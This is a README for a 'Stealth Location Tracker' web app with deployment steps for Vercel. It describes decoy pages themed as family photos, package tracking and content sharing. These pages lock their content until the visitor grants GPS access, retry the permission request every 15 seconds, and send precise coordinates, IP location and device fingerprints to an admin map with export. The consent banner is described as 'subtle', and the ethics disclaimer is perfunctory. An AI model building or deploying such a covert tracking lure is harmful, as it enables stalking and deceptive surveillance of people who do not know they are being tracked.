# 📍 Stealth Location Tracker

A sophisticated web application for location tracking with customizable content pages and comprehensive admin dashboard.

## ✨ Features

### 🎯 Stealth Tracking Pages
- **Multiple themed pages** - Photos, delivery, content sharing
- **GPS-locked content** - Content only visible after location permission
- **Customizable via admin** - Edit any page content dynamically
- **Mobile responsive** - Beautiful on all devices
- **Dark mode support** - Automatic theme switching

### 🔒 Advanced Security
- **Persistent location requirement** - No content without GPS
- **Auto-retry mechanism** - Attempts location every 15 seconds
- **Subtle consent banner** - GDPR compliant
- **Rate limiting** - Prevents abuse
- **Environment-based auth** - Secure admin access

### 📊 Admin Dashboard
- **Real-time tracking data** - View all submissions
- **Interactive map** - Visualize locations
- **Export functionality** - Download all data
- **Content editor** - Customize tracking pages
- **Device fingerprinting** - Detailed browser info

## 🚀 Quick Deploy to Vercel

### 1. Fork & Clone
```bash
git clone https://github.com/yourusername/geolocation-tracker.git
cd geolocation-tracker
```

### 2. Install Dependencies
```bash
npm install
```

### 3. Set Environment Variables

Copy `.env.example` to `.env` and update:
```env
ADMIN_USERNAME=your-secure-username
ADMIN_PASSWORD=your-secure-password
NODE_ENV=production
```

### 4. Deploy to Vercel
```bash
npm install -g vercel
vercel --prod
```

### 5. Configure Environment Variables in Vercel

Dashboard → Settings → Environment Variables:
- `ADMIN_USERNAME` - Your admin username
- `ADMIN_PASSWORD` - Your admin password  
- `NODE_ENV` - Set to `production`

## 🔗 Available Routes

| Route | Description | Purpose |
|-------|-------------|---------|
| `/` | Auto-redirects to `/photos` | Landing page |
| `/photos` | Family Photo Gallery | Primary tracking page |
| `/delivery` | Package Tracking | Delivery-themed tracker |
| `/share` | Content Sharing | Share-themed tracker |
| `/view` | Generic Viewer | Flexible content |
| `/album` | Photo Album | Album-themed tracker |
| `/content` | Content Display | Generic content |
| `/admin` | Admin Dashboard | View all tracked data |

## 🎨 Customization

### Via Admin Dashboard
1. Navigate to `/admin`
2. Login with your credentials
3. Click "🎨 Edit Content"
4. Customize each page:
   - Page title & subtitle
   - Content type & theme
   - Images & captions
   - Custom HTML embeds

### Via Code
Edit files in `/public`:
- `design-system.css` - Global theme variables
- `track-styles.css` - Tracking page styles
- `admin-styles.css` - Admin dashboard styles

## 🔒 Security Features

### GPS Lock System
- Content encrypted in JavaScript
- Only decrypts after location granted
- Cannot bypass via developer tools
- Auto-retry if permission denied

### Admin Protection  
- Environment variable authentication
- No default credentials in production
- Secure session handling
- HTTPS required

### Privacy Compliance
- Subtle cookie consent banner
- Clear data usage disclosure
- GDPR/CCPA compliant design
- User consent required

## 📊 Data Collection

### Information Captured
- **GPS Coordinates** - Latitude, longitude, accuracy
- **IP Geolocation** - City, region, country, ISP
- **Device Info** - Browser, OS, screen size
- **Browser Details** - User agent, language, timezone
- **Hardware** - CPU cores, memory, platform
- **Network** - Connection type, online status

### Data Storage
- JSON file storage (`tracking-data.json`)
- Persists between deployments
- Export via admin dashboard
- Consider MongoDB for scale

## 🛠️ Development

### Local Development
```bash
# Start development server
npm start

# Access at http://localhost:3000
```

### Testing
1. Open multiple tracking pages
2. Test GPS approval/denial flows  
3. Verify admin dashboard data
4. Check mobile responsiveness
5. Test dark/light mode toggle

## 📱 Mobile Support

- **iOS Safari** ✅ Full support
- **Chrome Mobile** ✅ Full support
- **Firefox Mobile** ✅ Full support
- **Samsung Internet** ✅ Full support

### Mobile Considerations
- GPS more accurate than desktop
- Permission prompts may vary
- Test location settings per OS
- Battery usage considerations

## ⚡ Performance

### Optimizations
- Static asset caching
- Compressed responses
- Minimal dependencies
- Fast cold starts
- CDN distribution via Vercel

### Limits
- Rate limiting: 100 req/15min
- Location submissions: 10/5min
- Function timeout: 10 seconds
- Adjust in `server.js` as needed

## 🚨 Troubleshooting

### Common Issues

**"Cannot read property 'coords' of undefined"**
- User denied GPS permission
- Content remains locked as designed

**"Rate limit exceeded"**
- Wait 5-15 minutes
- Adjust limits if needed

**"Admin login failed"**
- Check environment variables
- Ensure not using defaults

**"Content not showing"**
- GPS permission required
- Check browser location settings

## 📈 Monitoring

### Vercel Dashboard
- Function logs
- Error tracking  
- Performance metrics
- Deployment history

### Admin Dashboard
- Total tracks count
- GPS vs IP breakdown
- Recent submissions
- Export functionality

## 🔄 Updates

### Deployment
```bash
git add .
git commit -m "Update"
git push origin main
```

Vercel auto-deploys on push.

### Database Migration
Future enhancement - currently JSON storage.
Consider PostgreSQL or MongoDB for production scale.

## 🤝 Contributing

1. Fork the repository
2. Create feature branch
3. Commit changes
4. Push to branch
5. Open pull request

## ⚖️ Legal

- Obtain explicit consent
- Follow local privacy laws
- Secure data properly
- Regular security audits
- Respect user privacy

## 📞 Support

- Check [DEPLOYMENT_GUIDE.md](DEPLOYMENT_GUIDE.md)
- Review Vercel logs
- Inspect browser console
- Test in incognito mode

---

**Remember**: With great power comes great responsibility. Always obtain proper consent and use ethically.
